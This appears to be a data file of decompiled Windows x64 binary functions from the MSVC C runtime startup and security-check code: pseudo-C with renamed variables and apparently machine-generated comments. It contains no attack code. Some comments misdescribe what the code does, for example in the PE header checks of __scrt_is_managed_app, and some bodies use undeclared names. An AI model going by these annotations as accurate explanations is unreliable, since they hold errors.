{"Function Name": "__scrt_release_startup_lock", "Address": "14000ad08", "Source Code": "\nvoid __scrt_release_startup_lock(char is_null)\n{\n    // Check if the UCRT DLL is in use and if the parameter is null\n    if (__scrt_is_ucrt_dll_in_use() && (is_null == '\\0')) {\n        // Acquire the lock to ensure thread safety\n        LOCK();\n        \n        // Release the startup lock by setting the variable to 0\n        startup_lock = 0;\n        \n        // Release the lock after modifying the shared resource\n        UNLOCK();\n    }\n}\n"}
{"Function Name": "__scrt_uninitialize_crt", "Address": "14000ad2c", "Source Code": "\nundefined8 __scrt_uninitialize_crt(bool is_initialized, char is_valid)\n{\n    // Check if the global variable DAT_140039660 is null or if param_2 is null\n    if ((global_status == '\\0') || (is_valid == '\\0')) {\n        // Call the function to uninitialize the CRT with the provided parameter\n        uninitialize_crt(is_initialized);\n        // Return a concatenated value of the uninitialized result and a constant\n        return concatenate_values((int7)((ulonglong)vcrt_uninitialize(is_initialized) >> 8), 1);\n    }\n    // Return a default concatenated value if the conditions are not met\n    return concatenate_values(0, 1);\n}\n"}
{"Function Name": "_onexit", "Address": "14000ad58", "Source Code": "\n_onexit_t __cdecl _onexit(_onexit_t function_pointer) // Function definition for _onexit that takes a function pointer _Func\n{\n    int return_value; // Variable to store the return value of function calls\n    byte lower_bits = (byte)data_value_1 & 0x3f; // Extracting the lower 6 bits of DAT_140038080\n\n    // Check if the XOR of DAT_140038080 and _DAT_140039668 results in all bits being set to 1\n    if (((data_value_1 ^ data_value_2) >> lower_bits | (data_value_1 ^ data_value_2) << 0x40 - lower_bits) == 0xffffffffffffffff) {\n        return_value = function_call_1(function_pointer); // Call FUN_140013158 if the condition is true\n    } else {\n        return_value = register_exit_function(&DAT_140039668, function_pointer); // Register the exit function if the condition is false\n    }\n\n    // Return _Func if iVar1 is 0, otherwise return a null pointer\n    return (return_value == 0) ? function_pointer : (_onexit_t)0x0; \n}\n"}
{"Function Name": "atexit", "Address": "14000ada8", "Source Code": "\nint __cdecl atexit(_func_5014 *function_pointer)  // Function declaration for atexit, taking a function pointer as a parameter\n{\n    // Call _onexit with the function pointer cast to _onexit_t and check if the return value is not null\n    return (on_exit_function((_onexit_t)function_pointer) != (_onexit_t)0x0) - 1;  // Return -1 if _onexit returns null, otherwise return 0\n}\n"}
{"Function Name": "operator_new", "Address": "14000adc0", "Source Code": "\nvoid * __cdecl operator_new(__uint64 size) // Function to allocate memory\n{\n    LPVOID allocated_memory; // Pointer to hold the allocated memory address\n    do {\n        allocated_memory = allocate_memory(size); // Attempt to allocate memory of size param_1\n        if (allocated_memory != (LPVOID)0x0) { // Check if allocation was successful\n            return allocated_memory; // Return the allocated memory address\n        }\n    } while (custom_new_handler(size) != 0); // Call custom new handler if allocation failed\n\n    error_handling_function(); // Call a function (possibly for error handling or logging)\n    return (void *)(*(code *)system_call(3))(); // Invoke a system call or alternative allocation method\n}\n"}
{"Function Name": "FUN_14000adc8", "Address": "14000adc8", "Source Code": "\nundefined8 * FUN_14000adc8(undefined8 *vftable_pointer, ulonglong bit_check_value)\n{\n    // Assign the vftable of type_info to the location pointed to by param_1\n    *vftable_pointer = type_info::vftable;\n\n    // Check if the least significant bit of param_2 is set\n    if (bit_check_value & 1) {\n        // Call the thunk function FUN_14000b460 if the condition is true\n        thunk_FUN_14000b460();\n    }\n\n    // Return the pointer param_1\n    return vftable_pointer;\n}\n"}
{"Function Name": "FUN_14000adf4", "Address": "14000adf4", "Source Code": "\nvoid FUN_14000adf4(void) // Function definition\n{\n    code *functionPointer; // Pointer to a function\n    int returnValue; // Variable to store return value of _configure_wide_argv\n    undefined8 functionResult; // Variable to store return value of FUN_14000b974\n    undefined4 *pointerToUndefined4; // Pointer to an undefined4 type\n\n    FUN_140013394(2); // Call FUN_140013394 with argument 2\n    functionResult = FUN_14000b974(); // Call FUN_14000b974 and store the result in uVar5\n    _set_fmode((int)functionResult); // Set the file mode using the value from uVar5\n    pointerToUndefined4 = (undefined4 *)FUN_1400148c0(); // Call FUN_1400148c0 and store the pointer in puVar6\n    *pointerToUndefined4 = (int)FUN_140007740(); // Store the result of FUN_140007740 at the location pointed by puVar6\n    \n    if ((char)FUN_14000abc0(1) != '\\0') { // Check if the result of FUN_14000abc0(1) is not zero\n        FUN_14000b9d0(); // Call FUN_14000b9d0\n        atexit(FUN_14000ba0c); // Register FUN_14000ba0c to be called at exit\n        returnValue = _configure_wide_argv((int)FUN_140007740()); // Configure wide argv and store the result in iVar4\n        if (returnValue == 0) { // Check if _configure_wide_argv succeeded\n            FUN_14000b97c(); // Call FUN_14000b97c\n            if (FUN_14000b9b4() != 0) { // Check if FUN_14000b9b4 returns a non-zero value\n                FUN_1400133f4(0x140007740); // Call FUN_1400133f4 with the argument 0x140007740\n            }\n            _guard_check_icall(); // Perform a guard check on the function call\n            _guard_check_icall(); // Perform another guard check on the function call\n            _configthreadlocale((int)FUN_140007740()); // Configure thread locale using the value from FUN_140007740\n            if (FUN_14000b98c() != '\\0') { // Check if FUN_14000b98c returns a non-zero value\n                common_initialize_environment_nolock<wchar_t>(); // Initialize the environment without a lock\n            }\n            if ((int)FUN_140007740() == 0) { // Check if the result of FUN_140007740 is zero\n                return; // Exit the function if the condition is met\n            }\n        }\n    }\n    __scrt_fastfail(7); // Trigger a fast fail with error code 7\n    functionPointer = (code *)swi(3); // Call swi(3) and store the result in pcVar1\n    (*functionPointer)(); // Call the function pointed to by pcVar1\n}\n"}
{"Function Name": "FUN_14000aeac", "Address": "14000aeac", "Source Code": "\nundefined8 function_returning_undefined_type(void) // Function definition returning an undefined 8-byte type\n{\n    return function_call(), 0; // Call FUN_14000b998() and return 0\n}\n"}
{"Function Name": "FUN_14000aebc", "Address": "14000aebc", "Source Code": "\nvoid processFunction(void) // Function definition for FUN_14000aebc\n{\n    helperFunction(); // Call to another function FUN_14000b880\n    anotherFunction((uint)retrieveValue()); // Call to FUN_140014894 with the result of FUN_140007740 cast to uint\n    return; // Return from the function\n}\n"}
{"Function Name": "FUN_14000aed8", "Address": "14000aed8", "Source Code": "\nulonglong FUN_14000aed8(void) // Function declaration\n{\n    uint unsignedIntValue; // Variable to hold a 32-bit unsigned integer\n    undefined8 initializationStatus; // Variable to hold an 8-byte undefined type\n    ulonglong nonWritableCheck; // Variable to hold a 64-bit unsigned long long\n    ushort *ushortPointer; // Pointer to a 16-bit unsigned short\n\n    initializationStatus = __scrt_initialize_crt(1); // Initialize the CRT (C Runtime)\n    \n    if ((char)initializationStatus == '\\0') { // Check if initialization failed\n        __scrt_fastfail(7); // Trigger a fast fail if initialization failed\n    } else {\n        initializationStatus = __scrt_acquire_startup_lock(); // Acquire the startup lock\n        unsignedIntValue = (uint)CONCAT71((int7)((ulonglong)unaff_RBX >> 8), (char)initializationStatus); // Concatenate values for further processing\n        \n        if (DAT_140039650 == 0) { // Check if the initialization flag is not set\n            DAT_140039650 = 1; // Set the initialization flag\n            if ((int)_initterm_e((undefined8 *)&DAT_1400214a0, (undefined8 *)&DAT_1400214e0) != 0) { // Initialize a term and check for errors\n                return 0xff; // Return error code if initialization fails\n            }\n            _initterm((undefined8 *)&DAT_1400213f0, (undefined8 *)&DAT_140021498); // Initialize another term\n            DAT_140039650 = 2; // Update the initialization flag\n        }\n        \n        __scrt_release_startup_lock((char)initializationStatus); // Release the startup lock\n        \n        if ((*FUN_14000b9c0() != 0) && (nonWritableCheck = __scrt_is_nonwritable_in_current_image((longlong)FUN_14000b9c0()), (char)nonWritableCheck != '\\0')) { // Check if a certain condition is met\n            (*(code *)PTR__guard_dispatch_icall_1400213e8)(0); // Dispatch a guard call\n        }\n        \n        if ((*FUN_14000b9c8() != 0) && (nonWritableCheck = __scrt_is_nonwritable_in_current_image((longlong)FUN_14000b9c8()), (char)nonWritableCheck != '\\0')) { // Check another condition\n            _register_thread_local_exe_atexit_callback(*FUN_14000b9c8()); // Register a thread-local exit callback\n        }\n        \n        unsignedIntValue = FUN_140002730((HINSTANCE)&IMAGE_DOS_HEADER_140000000, 0, _get_wide_winmain_command_line(), (uint)__scrt_get_show_window_mode()); // Call a function to get a value based on parameters\n        \n        if ((char)__scrt_is_managed_app() != '\\0') { // Check if the application is managed\n            _cexit(); // Call exit function\n            __scrt_uninitialize_crt(true, '\\0'); // Uninitialize the CRT\n            return (ulonglong)unsignedIntValue; // Return the value obtained earlier\n        }\n        \n        goto LAB_14000b039; // Jump to the label for further processing\n    }\n    \n    __scrt_fastfail(7); // Trigger a fast fail if initialization failed\nLAB_14000b039:\n    FUN_14001284c(unsignedIntValue); // Call a function with the obtained value\n    FUN_140012804(unsignedIntValue); // Call another function with the obtained value\n    return ((code *)swi(3))(); // Return the result of a system call\n}\n"}
{"Function Name": "entry", "Address": "14000b04c", "Source Code": "\nvoid entry(void)\n{\n    // Initialize the security cookie for the current execution context\n    initialize_security_cookie();\n    \n    // Call the function FUN_14000aed8, which likely performs some critical operation\n    perform_critical_operation();\n}\n"}
{"Function Name": "__GSHandlerCheck", "Address": "14000b060", "Source Code": "\nundefined8\n__GSHandlerCheck(undefined8 handler_param, ulonglong check_param_1, undefined8 check_param_2, longlong check_param_3)\n{\n    // Call the common handler check function with parameters\n    // param_2, param_4, and a pointer to a uint located at offset 0x38 from param_4\n    __GSHandlerCheckCommon(check_param_1, check_param_3, *(uint **)(check_param_3 + 0x38));\n    \n    // Return 1 indicating successful execution\n    return 1;\n}\n"}
{"Function Name": "__GSHandlerCheckCommon", "Address": "14000b080", "Source Code": "\nvoid __GSHandlerCheckCommon(ulonglong input_value, longlong memory_address, uint *flags)\n{\n    ulonglong calculated_value = input_value; // Initialize uVar2 with the value of param_1\n    if ((*flags & 4) != 0) { // Check if the 3rd bit of param_3 is set\n        // Calculate new uVar2 based on the second and third elements of param_3\n        calculated_value = (longlong)(int)flags[1] + input_value & (longlong)(int)-flags[2];\n    }\n    // Retrieve a value from a specific memory location based on param_2\n    ulonglong retrieved_value = (ulonglong)*(uint *)(*(longlong *)(memory_address + 0x10) + 8);\n    // Check if the lower nibble of a byte at a calculated address is not zero\n    if ((*(byte *)(retrieved_value + 3 + *(longlong *)(memory_address + 8)) & 0xf) != 0) {\n        // Update param_1 by adding a masked value from the calculated address\n        input_value += (*(byte *)(retrieved_value + 3 + *(longlong *)(memory_address + 8)) & 0xfffffff0);\n    }\n    // Perform a security check using the modified param_1 and a cookie value\n    __security_check_cookie(input_value ^ *(ulonglong *)((longlong)(int)(*flags & 0xfffffff8) + calculated_value));\n}\n"}
{"Function Name": "__GSHandlerCheck_EH", "Address": "14000b0dc", "Source Code": "\nvoid __GSHandlerCheck_EH(EHExceptionRecord *exception_record, ulonglong ulong_value, _CONTEXT *context, _xDISPATCHER_CONTEXT *dispatcher_context)\n{\n    // Retrieve a longlong value from the dispatcher context at offset 0x38\n    longlong long_value = *(longlong *)(dispatcher_context + 0x38);\n    \n    // Call the common handler check function with the provided parameters\n    __GSHandlerCheckCommon(ulong_value, (longlong)dispatcher_context, (uint *)(long_value + 4));\n    \n    // Check if the condition based on exception record and lVar1 is met\n    if ((*(uint *)(long_value + 4) & ((*(uint *)(exception_record + 4) & 0x66) != 0) + 1) != 0) {\n        // If the condition is met, call the C++ frame handler\n        __CxxFrameHandler3(exception_record, ulong_value, context, dispatcher_context);\n    }\n}\n"}
{"Function Name": "_alloca_probe", "Address": "14000b170", "Source Code": "\nvoid _alloca_probe(void)\n{\n    undefined1 *adjustedLocalRes8Ptr; // Pointer to track the adjusted local_res8 address\n    undefined1 *stackLimitPtr; // Pointer for iterating downwards from StackLimit\n    undefined1 temporaryDataArray[32]; // Local array to hold temporary data\n    adjustedLocalRes8Ptr = temporaryDataArray - (longlong)inputRAX; // Adjust puVar1 based on in_RAX\n\n    // Check if local_res8 is less than in_RAX\n    if (temporaryDataArray < inputRAX) {\n        adjustedLocalRes8Ptr = (undefined1 *)0x0; // Set puVar1 to null if condition is true\n    }\n\n    // Check if puVar1 is less than StackLimit\n    if (adjustedLocalRes8Ptr < stackLimit) {\n        stackLimitPtr = (undefined1 *)stackLimit; // Initialize puVar2 to StackLimit\n        do {\n            stackLimitPtr -= 0x1000; // Move puVar2 down by one page (4096 bytes)\n            *stackLimitPtr = 0; // Clear the memory at the current puVar2 address\n        } while ((undefined1 *)((ulonglong)adjustedLocalRes8Ptr & 0xfffffffffffff000) != stackLimitPtr); // Continue until puVar2 reaches the aligned address of puVar1\n    }\n}\n"}
{"Function Name": "__raise_securityfailure", "Address": "14000b1c4", "Source Code": "\nvoid __raise_securityfailure(_EXCEPTION_POINTERS *exceptionPointers)\n{\n    // Set the unhandled exception filter to NULL\n    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);\n    \n    // Call the unhandled exception filter with the provided exception pointers\n    UnhandledExceptionFilter(exceptionPointers);\n    \n    // Terminate the current process with the specified exit code (0xc0000409)\n    TerminateProcess(GetCurrentProcess(), 0xc0000409);\n}\n"}
{"Function Name": "__report_gsfailure", "Address": "14000b1f8", "Source Code": "\nvoid __cdecl __report_gsfailure(uintptr_t stack_cookie)\n{\n    code *function_pointer; // Pointer to a function code\n    BOOL feature_check_result; // Variable to store the result of processor feature check\n    undefined1 temporary_stack_space[48]; // Stack space for temporary data\n    \n    // Check if a specific processor feature (0x17) is present\n    feature_check_result = IsProcessorFeaturePresent(0x17);\n    if (feature_check_result != 0) { // If the feature is present\n        function_pointer = (code *)swi(0x29); // Call a software interrupt\n        (*function_pointer)(2); // Execute the function pointed by pcVar1 with argument 2\n    }\n    \n    // Store a specific value in the stack space\n    *(undefined8 *)(temporary_stack_space + -8) = 0x14000b222;\n    // Capture the previous execution context\n    capture_previous_context((PCONTEXT)&DAT_140039740);\n    // Store the captured context in global variables\n    _DAT_1400396b0 = *(undefined8 *)(temporary_stack_space + 0x38);\n    _DAT_1400397d8 = temporary_stack_space + 0x40;\n    _DAT_1400397c0 = *(undefined8 *)(temporary_stack_space + 0x40);\n    _DAT_1400396a0 = 0xc0000409; // Set an error code\n    _DAT_1400396a4 = 1; // Set a flag\n    _DAT_1400396b8 = 1; // Set another flag\n    DAT_1400396c0 = 2; // Set a status code\n    // Store additional data in the stack space\n    *(undefined8 *)(temporary_stack_space + 0x20) = DAT_140038080;\n    *(undefined8 *)(temporary_stack_space + 0x28) = DAT_140038078;\n    // Store another specific value in the stack space\n    *(undefined8 *)(temporary_stack_space + -8) = 0x14000b2c4;\n    // Assign the captured context to another global variable\n    DAT_140039838 = _DAT_1400396b0;\n    // Raise a security failure exception\n    __raise_securityfailure((_EXCEPTION_POINTERS *)&PTR_DAT_140025d38);\n    return; // Exit the function\n}\n"}
{"Function Name": "__report_rangecheckfailure", "Address": "14000b2cc", "Source Code": "\n// Function to report a range check failure\nvoid __reportRangeCheckFailure(void)\n{\n    // Call the security failure reporting function with error code 8\n    __reportSecurityFailure(8);\n}\n"}
{"Function Name": "__report_securityfailure", "Address": "14000b2e0", "Source Code": "\nvoid __report_securityfailure(undefined4 security_param)\n{\n    code *function_pointer; // Pointer to a function (code type)\n    BOOL is_feature_present; // Variable to store the result of processor feature check\n    undefined1 temp_storage[32]; // Stack array for temporary storage\n\n    is_feature_present = IsProcessorFeaturePresent(0x17); // Check if a specific processor feature is present\n    if (is_feature_present != 0) { // If the feature is present\n        function_pointer = (code *)swi(0x29); // Get the address of the function to call\n        (*function_pointer)(security_param); // Call the function with param_1\n    }\n    \n    *(undefined8 *)(temp_storage + -8) = 0x14000b30a; // Store a specific value in the stack array\n    capture_current_context((PCONTEXT)&DAT_140039740); // Capture the current execution context\n    _DAT_1400396b0 = *(undefined8 *)(temp_storage + 0x28); // Store a value from the stack into a global variable\n    _DAT_1400397d8 = temp_storage + 0x30; // Set a global variable to point to a location in the stack\n    _DAT_1400396a0 = 0xc0000409; // Set a specific error code in a global variable\n    _DAT_1400396a4 = 1; // Set a flag in a global variable\n    _DAT_1400396b8 = 1; // Set another flag in a global variable\n    global_value_2 = (ulonglong)*(uint *)(temp_storage + 0x30); // Store a value from the stack into a global variable\n    *(undefined8 *)(temp_storage + -8) = 0x14000b376; // Store another specific value in the stack array\n    global_value_copy = _DAT_1400396b0; // Copy a value from one global variable to another\n    __raise_securityfailure((_EXCEPTION_POINTERS *)&exception_pointer); // Raise a security failure exception\n    return; // Exit the function\n}\n"}
{"Function Name": "capture_current_context", "Address": "14000b37c", "Source Code": "\nvoid capture_current_context(PCONTEXT param_1)\n{\n    // Store the instruction pointer from the context structure\n    DWORD64 instructionPointer = param_1->Rip;\n\n    // Lookup the function entry for the current instruction pointer\n    PRUNTIME_FUNCTION functionEntry = RtlLookupFunctionEntry(instructionPointer, NULL, NULL);\n\n    // Check if a valid function entry was found\n    if (functionEntry != NULL) {\n        // Perform a virtual unwind to retrieve the context information\n        RtlVirtualUnwind(0, 0, instructionPointer, functionEntry, param_1, NULL, NULL, NULL);\n    }\n}\n"}
{"Function Name": "capture_previous_context", "Address": "14000b3ec", "Source Code": "\nvoid capture_previous_context(PCONTEXT context)\n{\n    // Store the instruction pointer from the context structure\n    DWORD64 instructionPointer = context->Rip;\n    PRUNTIME_FUNCTION runtimeFunctionEntry; // Pointer to the runtime function entry\n    int loopCounter = 0; // Loop counter\n\n    // Capture the current context (registers, stack, etc.)\n    RtlCaptureContext();\n    \n    // Loop to unwind the stack and capture previous context\n    do {\n        // Look up the function entry for the current control PC\n        runtimeFunctionEntry = RtlLookupFunctionEntry(instructionPointer, NULL, NULL);\n        \n        // If no function entry is found, exit the function\n        if (runtimeFunctionEntry == NULL) {\n            return;\n        }\n        \n        // Unwind the virtual stack and update the context structure\n        RtlVirtualUnwind(0, 0, instructionPointer, runtimeFunctionEntry, context, NULL, NULL, NULL);\n        \n        // Increment the loop counter\n        loopCounter++;\n    } while (loopCounter < 2); // Repeat the process for a maximum of 2 iterations\n}\n"}
{"Function Name": "FUN_14000b460", "Address": "14000b460", "Source Code": "\nvoid freeResourcesFunction(void) // Function definition for FUN_14000b460\n{\n    freeBaseFunction(NULL); // Call _free_base function with NULL argument to free resources\n}\n"}
{"Function Name": "FUN_14000b468", "Address": "14000b468", "Source Code": "\nundefined8 * FUN_14000b468(undefined8 *exception_pointer,longlong exception_data_address)\n{\n    // Set the first element of param_1 to the vftable of std::bad_array_new_length\n    *exception_pointer = std::bad_array_new_length::vftable;\n    \n    // Copy the exception data from the memory location (param_2 + 8) to the second element of param_1\n    __std_exception_copy((longlong *)(exception_data_address + 8), exception_pointer + 1);\n    \n    // Return the modified pointer param_1\n    return exception_pointer;\n}\n"}
{"Function Name": "FUN_14000b4a4", "Address": "14000b4a4", "Source Code": "\nundefined8 * FUN_14000b4a4(undefined8 *array_pointer)\n{\n    // Set the third element of the array pointed to by param_1 to 0\n    array_pointer[2] = 0;\n\n    // Set the second element of the array to the error message \"bad array new length\"\n    array_pointer[1] = \"bad array new length\";\n\n    // Set the first element of the array to the vftable of std::bad_array_new_length\n    *array_pointer = std::bad_array_new_length::vftable;\n\n    // Return the modified array pointer\n    return array_pointer;\n}\n"}
{"Function Name": "FUN_14000b4c4", "Address": "14000b4c4", "Source Code": "\nvoid FUN_14000b4c4(void)\n{\n    code *functionPointer; // Pointer to a function (code type)\n    longlong longLongArray[5]; // Array to hold long long values, local variable\n\n    FUN_140009670(longLongArray); // Call function FUN_140009670 with local_28 as argument\n\n    FUN_14000c234(longLongArray, &DAT_140035fc0); // Call function FUN_14000c234 with local_28 and a data reference\n\n    (*((code *)swi(3)))(); // Call a function obtained from swi(3)\n}\n"}
{"Function Name": "FUN_14000b4e4", "Address": "14000b4e4", "Source Code": "\nvoid FUN_14000b4e4(void)\n{\n    code *functionPointer; // Declare a pointer to a function (code type)\n    \n    FUN_14000b4a4(argument); // Call function FUN_14000b4a4 with local_28 as argument\n    \n    FUN_14000c234(argument, &dataReference); // Call function FUN_14000c234 with local_28 and a data reference as arguments\n    \n    functionPointer = (code *)swi(3); // Call swi(3) and cast the result to a function pointer, storing it in pcVar1\n    \n    (*functionPointer)(); // Dereference pcVar1 and call the function it points to\n}\n"}
{"Function Name": "__isa_available_init", "Address": "14000b504", "Source Code": "\nundefined8 __isa_available_init(void)\n{\n    uint *cpuVersionInfoPtr; // Pointer to hold the result of cpuid_Version_info\n    longlong extendedFeatureInfo; // Variable to hold the result of cpuid_Extended_Feature_Enumeration_info\n    uint versionInfoFourthElement; // Variable to hold the fourth element of the cpuid_Version_info result\n    uint extendedFeatureInfoSecondElement; // Variable to hold the second element of the cpuid_Extended_Feature_Enumeration_info result\n    byte xcr0RegisterValue; // Variable to hold the XCR0 register value\n\n    datInitValue1 = 2; // Initialize DAT_140038094 to 2\n    datInitValue2 = 1; // Initialize DAT_140038090 to 1\n    cpuVersionInfoPtr = (uint *)cpuid_Version_info(1); // Get CPU version information\n    versionInfoFourthElement = cpuVersionInfoPtr[3]; // Store the fourth element of the version info\n\n    // Check if the CPU is from a recognized vendor\n    if (*(int *)cpuid_basic_info(0) == 0x756e6547 && \n        *(int *)(cpuid_basic_info(0) + 12) == 0x6c65746e && \n        *(int *)(cpuid_basic_info(0) + 8) == 0x49656e69) {\n        \n        datMaxValue = 0xffffffffffffffff; // Set DAT_140038098 to maximum value\n\n        // Check for specific CPU models and set flags accordingly\n        if (((*cpuVersionInfoPtr & 0xfff3ff0) == 0x106c0) || \n            ((*cpuVersionInfoPtr & 0xfff3ff0) == 0x20660) || \n            ((*cpuVersionInfoPtr & 0xfff3ff0) == 0x20670) || \n            ((*cpuVersionInfoPtr & 0xfff3ff0) - 0x30650 < 0x21 && \n            (0x100010001U >> ((ulonglong)((*cpuVersionInfoPtr & 0xfff3ff0) - 0x30650) & 0x3f) & 1 != 0))) {\n            \n            datFlags |= 1; // Set a flag in DAT_140039c10\n        }\n    }\n\n    // Check if the CPU supports extended feature enumeration\n    if (6 < *(int *)cpuid_basic_info(0)) {\n        extendedFeatureInfo = cpuid_Extended_Feature_Enumeration_info(7); // Get extended feature enumeration info\n        extendedFeatureInfoSecondElement = *(uint *)(extendedFeatureInfo + 4); // Store the second element of the extended feature info\n\n        // Check if a specific feature is supported\n        if ((extendedFeatureInfoSecondElement >> 9 & 1) != 0) {\n            datFlags |= 2; // Set another flag in DAT_140039c10\n        }\n    }\n\n    // Check for specific features in the CPU version\n    if ((versionInfoFourthElement >> 0x14 & 1) != 0) {\n        datInitValue2 = 2; // Update DAT_140038090\n        datInitValue1 = 6; // Update DAT_140038094\n\n        // Check for additional features and update values accordingly\n        if (((versionInfoFourthElement >> 0x1b & 1) != 0) && \n            ((versionInfoFourthElement >> 0x1c & 1) != 0) && \n            ((xcr0RegisterValue & 6) == 6)) {\n            \n            datInitValue1 = 0xe; // Update DAT_140038094\n            datInitValue2 = 3; // Update DAT_140038090\n\n            // Check for another feature and update values\n            if ((extendedFeatureInfoSecondElement & 0x20) != 0) {\n                datInitValue2 = 5; // Update DAT_140038090\n                datInitValue1 = 0x2e; // Update DAT_140038094\n            }\n        }\n    }\n    return 0; // Return 0 to indicate successful initialization\n}\n"}
{"Function Name": "__scrt_is_ucrt_dll_in_use", "Address": "14000b688", "Source Code": "\n// Function to check if the Universal C Runtime (UCRT) DLL is in use\nbool __scrt_is_ucrt_dll_in_use(void)\n{\n    // Return true if the global variable DAT_14003ad50 is not zero, indicating UCRT DLL is in use\n    return is_ucrt_dll_in_use != 0;\n}\n"}
{"Function Name": "FUN_14000b694", "Address": "14000b694", "Source Code": "\nvoid FUN_14000b694(void) // Function definition for FUN_14000b694\n{\n    data_value = 0; // Set the value of _DAT_140039c14 to 0\n}\n"}
{"Function Name": "__scrt_fastfail", "Address": "14000b69c", "Source Code": "\nvoid __scrt_fastfail(undefined4 error_code)\n{\n    code *function_pointer; // Pointer to a function\n    BOOL is_feature_present; // Boolean variable to store processor feature presence\n    LONG exception_filter_result; // Long variable for exception filter return value\n    PRUNTIME_FUNCTION runtime_function_entry; // Pointer to runtime function entry\n    undefined1 *stack_pointer; // Pointer to stack space\n    DWORD64 context_info; // Local variable for storing context information\n    undefined1 local_stack_space[232]; // Stack space for local variables\n    undefined1 context_capture[152]; // Local variable for context capture\n    DWORD64 address_storage; // Local variable for storing address\n\n    stack_pointer = local_stack_space; // Initialize pointer to stack space\n    is_feature_present = IsProcessorFeaturePresent(0x17); // Check if a specific processor feature is present\n    if (is_feature_present != 0) { // If the feature is present\n        function_pointer = (code *)swi(0x29); // Get the address of the system call\n        (*function_pointer)(error_code); // Call the system function with the parameter\n    }\n    *(undefined8 *)(stack_pointer + -8) = 0x14000b6cf; // Store a specific address in stack\n    FUN_14000b694(); // Call a function (likely for cleanup or logging)\n    *(undefined8 *)(stack_pointer + -8) = 0x14000b6e0; // Store another address in stack\n    FUN_14000c740((undefined1 (*) [16])context_capture, 0, 0x4d0); // Call a function with parameters\n    *(undefined8 *)(stack_pointer + -8) = 0x14000b6ea; // Store another address in stack\n    RtlCaptureContext(context_capture); // Capture the current execution context\n    *(undefined8 *)(stack_pointer + -8) = 0x14000b704; // Store another address in stack\n    runtime_function_entry = RtlLookupFunctionEntry(address_storage, &context_info, (PUNWIND_HISTORY_TABLE)0x0); // Lookup function entry for unwinding\n    if (runtime_function_entry != (PRUNTIME_FUNCTION)0x0) { // If a function entry is found\n        *(undefined8 *)(stack_pointer + 0x38) = 0; // Initialize a stack variable\n        *(undefined1 **)(stack_pointer + 0x20) = context_capture; // Set context pointer\n        *(undefined8 *)(stack_pointer + -8) = 0x14000b745; // Store another address in stack\n        RtlVirtualUnwind(0, context_info, address_storage, runtime_function_entry, *(PCONTEXT *)(stack_pointer + 0x20), NULL, NULL, NULL); // Perform a virtual unwind\n    }\n    *(undefined8 *)(stack_pointer + -8) = 0x14000b777; // Store another address in stack\n    FUN_14000c740((undefined1 (*) [16])(stack_pointer + 0x50), 0, 0x98); // Call another function with parameters\n    *(undefined8 *)(stack_pointer + 0x60) = unaff_retaddr; // Store return address\n    *(undefined4 *)(stack_pointer + 0x50) = 0x40000015; // Set a specific value in stack\n    *(undefined4 *)(stack_pointer + 0x54) = 1; // Set another value in stack\n    *(undefined8 *)(stack_pointer + -8) = 0x14000b799; // Store another address in stack\n    is_feature_present = IsDebuggerPresent(); // Check if a debugger is present\n    *(undefined8 *)(stack_pointer + -8) = 0x14000b7c5; // Store another address in stack\n    exception_filter_result = UnhandledExceptionFilter((EXCEPTION_POINTERS *)(stack_pointer + 0x40)); // Call the exception filter\n    if ((exception_filter_result == 0) && (is_feature_present != 1)) { // If no exception occurred and no debugger is present\n        *(undefined8 *)(stack_pointer + -8) = 0x14000b7d5; // Store another address in stack\n        FUN_14000b694(); // Call a cleanup or logging function\n    }\n    return; // Return from the function\n}\n"}
{"Function Name": "__scrt_get_show_window_mode", "Address": "14000b7e8", "Source Code": "\nWORD __scrt_get_show_window_mode(void)\n{\n    STARTUPINFOW startup_info; // Declare a variable to hold startup information\n    GetStartupInfoW(&startup_info); // Retrieve the startup information for the current process\n    // Check if the STARTF_USESHOWWINDOW flag is set; if so, return the wShowWindow value, otherwise return 10\n    return ((startup_info.dwFlags & STARTF_USESHOWWINDOW) != 0) ? startup_info.wShowWindow : 10;\n}\n"}
{"Function Name": "__scrt_is_managed_app", "Address": "14000b82c", "Source Code": "\nulonglong __scrt_is_managed_app(void)\n{\n    HMODULE moduleHandle; // Declare a handle for the module\n    ulonglong returnValue; // Variable to store the return value\n    int *moduleProperties; // Pointer to an integer for checking module properties\n\n    // Get the handle of the current module\n    moduleHandle = GetModuleHandleW((LPCWSTR)0x0);\n    \n    // Check if the module handle is null or if it does not meet certain criteria\n    if (moduleHandle == (HMODULE)0x0 || \n        (short)moduleHandle->unused != 0x5a4d || // Check for 'MZ' signature\n        (moduleProperties = (int *)((longlong)&moduleHandle->unused + (longlong)moduleHandle[0xf].unused), \n        *moduleProperties != 0x4550) || // Check for 'PE' signature\n        ((short)moduleProperties[6] != 0x20b || // Check for specific machine type\n        ((uint)moduleProperties[0x21] < 0xf)) || // Check for minimum number of sections\n        (moduleProperties[0x3e] == 0))) { // Check if the entry point is valid\n        returnValue = (ulonglong)moduleHandle & 0xffffffffffffff00; // Set return value to module handle with last two bytes cleared\n    } else {\n        returnValue = 0x201; // Set return value to indicate a managed application\n    }\n    \n    return returnValue; // Return the result\n}\n"}
{"Function Name": "FUN_14000b880", "Address": "14000b880", "Source Code": "\nvoid handleException(void) // Function definition for FUN_14000b880\n{\n    SetUnhandledExceptionFilter(customExceptionFilter); // Set a custom exception filter using FUN_14000b890\n}\n"}
{"Function Name": "FUN_14000b890", "Address": "14000b890", "Source Code": "\nundefined8 FUN_14000b890(undefined8 *input_array)\n{\n    int *int_pointer = (int *)*input_array; // Cast the first element of param_1 to an integer pointer\n\n    // Check if the first integer is a specific value and if certain conditions on other integers are met\n    if ((*int_pointer == -0x1f928c9d) && (int_pointer[6] == 4) &&\n        (int_pointer[8] + 0xe66cfae0U < 3 || (int_pointer[8] == 0x1994000))) {\n        \n        terminate(); // Call the terminate function if conditions are satisfied\n        return ((code *)swi(3))(); // Call a system interrupt and return its result\n    }\n    \n    return 0; // Return 0 if conditions are not met\n}\n"}
